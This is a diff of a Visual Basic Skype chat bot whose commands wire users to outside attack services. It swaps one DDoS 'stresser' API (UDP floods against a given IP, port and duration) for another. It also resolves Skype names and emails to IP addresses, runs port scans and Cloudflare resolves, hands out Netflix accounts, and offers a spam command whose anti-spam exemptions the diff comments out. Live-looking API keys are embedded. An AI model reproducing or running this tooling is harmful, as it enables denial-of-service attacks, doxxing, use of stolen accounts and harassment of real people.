@@ -19,15 +19,18 @@ Public Class Form1
         anonymousproxy = 2
         transparentproxy = 1
     End Enum
-    Public Const version As String = "5.1.0.2"
+    Public Const version As String = "1.0.0.1"
     Public state As Integer = 1
     Public launched As Boolean = False
     Dim banmsg As String = "You are banned, Sorry!"
     Public api As String = ""
     Public ddosapi2 As String = ""
+    Dim factory As ChatterBotFactory = New ChatterBotFactory()
+    Dim AIb As ChatterBot = factory.Create(ChatterBotType.PANDORABOTS, "b0dafd24ee35a477")
+    Dim AISession As ChatterBotSession = AIb.CreateSession()
     Dim adminst As Boolean = 1
-    Dim resapi As String = "http://api.c99.nl/skyperesolver.php?key=skypebotje123&username="
-    Dim resapi2 As String = "http://skyperesolver.net/api.php?key=48chxIPATBMoJCa&username="
+    Dim resapi As String = "http://skypebot.ga/apis/apis/resolve.php?u=" 'c99
+    Dim resapi2 As String = "http://skypebot.ga/apis/apis/resolve2.php?u="
     Dim resapi3 As String = "http://api.predator.wtf/resolver/?arguments="
     Dim cacheapi As String = "http://api.c99.nl/resolvedb.php?key=skypebotje123&username="
     Dim cacheapi2 As String = "http://api.predator.wtf/lookup/?arguments="
@@ -97,9 +100,6 @@ retr:
     Sub AI1(msg As ChatMessage)
         If msg.Body = "" Then Exit Sub
         Dim ai As ChatMessage = msg.Chat.SendMessage("Thinking...")
-        Dim factory As ChatterBotFactory = New ChatterBotFactory()
-        Dim AIb As ChatterBot = factory.Create(ChatterBotType.PANDORABOTS, "b0dafd24ee35a477")
-        Dim AISession As ChatterBotSession = AIb.CreateSession()
         Dim s As String = AISession.Think(msg.Body.Remove(0, 1))
         s = StripTags(s)
         If s.ToLower.Contains("To use my calculator, click here!".ToLower) Then
@@ -447,11 +447,11 @@ retr:
     End Function
     Sub processcommand(msg As ChatMessage)
         Try
-            api = "https://k-stress.pw/send.php?key=k3gucmstj4ssr6ywzuz8bomqm2y9vnib5ci3in5top8hbj1lp7&method=UDP&host=[ip]&time=[time]&port=[port]"
-            ddosapi2 = "https://k-stress.pw/send.php?key=f0r7otnjck9r18ehboi9akbkdcjmmpy1wf42iqqilsvusc8jyb&method=UDP&host=[ip]&time=[time]&port=[port]"
-            If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
-                Exit Sub
-            End If
+            api = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
+            ddosapi2 = "http://netpunch.xyz/out/api.php?host=[ip]&key=KEYGOESHERE&port=[port]&time=[time]&method=UDP"
+            'If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
+            '    Exit Sub
+            'End If
             If msg.Sender.Handle = Skypattach.CurrentUserHandle Or msg.Sender.Handle = "jeteroll83" Then GoTo whitelisted
             Dim parts() As String = TextBox3.Text.Split(New String() {Environment.NewLine},
                                           StringSplitOptions.None)
@@ -1057,7 +1057,7 @@ roo:
             If command = "netflix" Then
                 Dim mc As ChatMessage = msg.Chat.SendMessage("Getting a new netflix account...")
                 Dim w As New WebClient
-                Dim res As String = POST("http://apis.skypebot.ga/apis/gener3.php?id=1", "h=True")
+                Dim res As String = POST("http://apis.skypebot.ga/apis/gen.php?account=Netflix&auth=max", "h=True")
                 Try
                     If IsPremium(msg.Sender.Handle) Then
                     Else
@@ -1230,7 +1230,9 @@ fq:
                 AddSwagToMSG(m2s, "Getting skypename...")
                 Dim w As New Net.WebClient
                 w.Proxy = Nothing
-                AddSwagToMSG(m2s, w.DownloadString("http://api.c99.nl/email2skype.php?key=skypebotje123&email=" & cmd).Replace(" | ", ", "))
+                Dim skypen As String = POST("http://apis.skypebot.ga/apis/mail2skype.php", "auth=sb&u=" & cmd)
+                If skypen = "" Then skypen = "No results found."
+                AddSwagToMSG(m2s, skypen.Replace(" | ", ", "))
             End If
             'MAIL2SKYPE END
             'MAIL2IP START
@@ -1241,7 +1243,10 @@ fq:
                 AddSwagToMSG(m2s, "Getting skypename...")
                 Dim w As New Net.WebClient
                 w.Proxy = Nothing
-                Dim skypename As String = w.DownloadString("http://api.c99.nl/email2skype.php?key=skypebotje123&email=" & cmd).Replace(" | ", " ")
+                Dim skypename As String = POST("http://apis.skypebot.ga/apis/mail2skype.php", "auth=sb&u=" & cmd).Replace(" | ", " ")
+                If skypename = "" Then
+                    AddSwagToMSG(m2s, "No results found!")
+                End If
                 m2s.Body = "Resolving..."
                 If skypename.Contains(" ") Then
                     Dim ips() As String = skypename.Split(" ")
@@ -1358,6 +1363,7 @@ raa:
                 Dim ipts As New WebClient
                 ipts.Proxy = Nothing
                 Dim lol As ChatMessage = msg.Chat.SendMessage("Initializing...")
+                ipts.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
                 Dim l As String = ipts.DownloadString("http://api.c99.nl/ip2skype.php?key=skypebotje123&ip=" & cmd)
                 AddSwagToMSG(lol, l)
                 Exit Sub
@@ -1580,37 +1586,17 @@ En:
             If command = "portopen" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "portopen <ip> <port>")
             If command.StartsWith("portopen ") Then
                 Dim portopen As ChatMessage = msg.Chat.SendMessage("Checking the port...")
-                Dim info() As String = command.Replace("portopen ", "").Split(" ")
+                Dim info() As String = command.Replace("portopen", "").Split(" ")
                 Dim ip As String = info(0)
                 Dim port As String = info(1)
-                Dim w As New WebClient
-                w.Proxy = Nothing
-                Dim portopenapi As String = "http://apionly.com/portchecker.php?host=[ip]&port=[port]"
-                Dim res As String = w.DownloadString(portopenapi.Replace("[ip]", ip).Replace("[port]", port))
-
-                If res = "ONLINE" Then
+                If isportopen(ip, port) = True Then
                     portopen.Body = "Port on " & ip & ":" & port & " is open!"
-                ElseIf res = "Invalid IP" Then
-                    portopen.Body = ip & " is an invalid IP"
                 Else
                     portopen.Body = "Port on " & ip & ":" & port & " is closed!"
                 End If
             End If
-
-            'If command = "portopen" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "portopen <ip> <port>")
-            'If command.StartsWith("portopen ") Then
-            '    Dim portopen As ChatMessage = msg.Chat.SendMessage("Checking the port...")
-            '    Dim info() As String = command.Replace("portopen ", "").Split(" ")
-            '    Dim ip As String = info(0)
-            '    Dim port As String = info(1)
-            '    If isportopen(ip, port) = True Then
-            '        portopen.Body = "Port on " & ip & ":" & port & " is open!"
-            '    Else
-            '        portopen.Body = "Port on " & ip & ":" & port & " is closed!"
-            '    End If
-            'End If
-
             'PORTOPEN END
+
             'GAME START
             If command = "game" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "game <help/parameters>")
             If command.StartsWith("game ") Then
@@ -1773,6 +1759,7 @@ exitt:
                 Dim cmd As String = command.Replace("deadfly ", "")
                 If cmd.StartsWith("http") Or cmd.StartsWith("www.") Then
                     Dim w As New WebClient
+                    w.Headers.Add(HttpRequestHeader.Referer, "http://api.c99.nl/cmd/")
                     w.Proxy = Nothing
                     Dim res As String = w.DownloadString("http://api.c99.nl/deadfly.php?key=skypebotje123&url=" & cmd)
                     AddSwagToMSG(dead, "We killed the fly! Here the link: " & res)
@@ -1857,14 +1844,11 @@ exitt:
             'DICT START
             If command = "dict" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "dict <word>")
             If command.StartsWith("dict ") Then
-                Dim api As String = "http://api.c99.nl/dictionary.php?key=skypebotje123&word="
-                Dim w As New WebClient
-                w.Proxy = Nothing
-                Dim dict As ChatMessage = msg.Chat.SendMessage("Initializing...")
-                Dim result As String = w.DownloadString(api & command.Replace("dict ", "").Replace("<br>", ""))
-                If result.Contains("c99") Or result.Contains("has been suspended!") Then result = "Not found!"
+                Dim api As String = "http://skypebot.ga/apis/apis/dict.php"
 
-                AddSwagToMSG(dict, result)
+                Dim dict As ChatMessage = msg.Chat.SendMessage("Initializing...")
+
+                AddSwagToMSG(dict, POST(api, "auth=sb&def=" & command.Remove(0, 5)))
             End If
             'DICT END
             'WEATHER START
@@ -1903,7 +1887,6 @@ exitt:
             If command.StartsWith("cfresolve ") Then
                 Dim l As ChatMessage = msg.Chat.SendMessage("Trying to resolve...")
                 Dim w As New WebClient
-                'l.Body = w.DownloadString("http://APIOnly.com/cfresolver.php?domain=" & command.Replace("cfresolve ", "")).Replace("<br>", "")
                 l.Body = w.DownloadString("http://api.predator.wtf/cfresolve/?arguments=" & command.Replace("cfresolve ", "")).Replace("<br>", vbNewLine)
                 Exit Sub
             End If
@@ -2200,10 +2183,10 @@ l:
     End Function
     Sub spam(msg As ChatMessage)
         Try
-            If msg.ChatName = "#dimabal10000/$be5e245309b3d76a" Or msg.ChatName = "#zigi.bot/$7582f4644528febf" Then
-                msg.Chat.SendMessage("Nope, this group is anti spam...")
-                Exit Sub
-            End If
+            'If msg.ChatName = "#dimabal10000/$be5e245309b3d76a" Or msg.ChatName = "#zigi.bot/$7582f4644528febf" Then
+            '    msg.Chat.SendMessage("Nope, this group is anti spam...")
+            '    Exit Sub
+            'End If
             Dim command As String = msg.Body.Remove(0, trigger.Length)
             Dim cmd As String = command.Replace("spam ", "")
             Dim d() As String
@@ -2211,8 +2194,8 @@ l:
             d = t.Split(" ")
             Dim tosend As String = d(1)
             If IsNumeric(d(0)) = True Then
-                If d(0) > 100 Then
-                    d(0) = 100
+                If d(0) > 10 Then
+                    d(0) = 10
                 End If
             Else
                 msg.Chat.SendMessage("ERROR: You entered an invalid number, try to swap the number and msg!")
@@ -2611,7 +2594,7 @@ noargs:
     Function portscan(ip As String)
         Dim w As New WebClient
         w.Proxy = Nothing
-        Return w.DownloadString("http://api.c99.nl/multiportscanner.php?key=skypebotje123&host=" & ip)
+        Return w.DownloadString("http://api.abrasivecraft.com/?tool=portscanner&ip=" & ip)
     End Function
     Function StripTags(ByVal html As String) As String
         ' Remove HTML tags.
@@ -2708,24 +2691,11 @@ noargs:
         MsgBox("We will maybe contact you later, thanks!")
     End Sub
     Function POST(api As String, content As String)
-        Dim request As WebRequest = WebRequest.Create(api)
-        request.Method = "POST"
-        Dim postData As String = content
-        Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-        request.ContentType = "application/x-www-form-urlencoded"
-        request.ContentLength = byteArray.Length
-        Dim dataStream As Stream = request.GetRequestStream()
-        dataStream.Write(byteArray, 0, byteArray.Length)
-        dataStream.Close()
-        Dim response As WebResponse = request.GetResponse()
-        Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
-        dataStream = response.GetResponseStream()
-        Dim reader As New StreamReader(dataStream)
-        Dim responseFromServer As String = reader.ReadToEnd()
-        reader.Close()
-        dataStream.Close()
-        response.Close()
-        Return responseFromServer
+        Dim w As New WebClient
+        w.Proxy = Nothing
+        w.Headers.Add(HttpRequestHeader.ContentType, "application/x-www-form-urlencoded")
+        Dim r As String = w.UploadString(api, content)
+        Return r
     End Function
     Function paste(content As String, Optional title As String = "Untitled")
         Try
@@ -2769,9 +2739,25 @@ l:
         Return Encoding.UTF8.GetString(Convert.FromBase64String(t))
     End Function
     Function paste2(content As String)
-        Dim w As New WebClient
-        w.Proxy = Nothing
-        Return w.DownloadString("http://api.c99.nl/textpaste.php?key=skypebotje123&content=" & content)
+        Dim post As String = "content=" & content & "&lexer=text&ttl=31536000&key="
+
+        Dim req As HttpWebRequest = DirectCast(HttpWebRequest.Create("https://pastee.org/submit"), HttpWebRequest)
+        req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36"
+        req.AllowAutoRedirect = True
+        req.ContentType = "application/x-www-form-urlencoded"
+        req.ContentLength = post.Length
+        req.Method = "POST"
+        req.KeepAlive = True
+        Dim requestStream As Stream = req.GetRequestStream()
+        Dim postBytes As Byte() = Encoding.ASCII.GetBytes(post)
+        requestStream.Write(postBytes, 0, postBytes.Length)
+        requestStream.Close()
+        Dim Res As HttpWebResponse = req.GetResponse()
+        Dim response As HttpWebResponse
+        Dim resUri As String
+        response = req.GetResponse
+        resUri = response.ResponseUri.AbsoluteUri
+        Return resUri.Replace("/preview", "")
     End Function
     Sub fdsqf() Handles MyBase.Shown
         TopMost = False
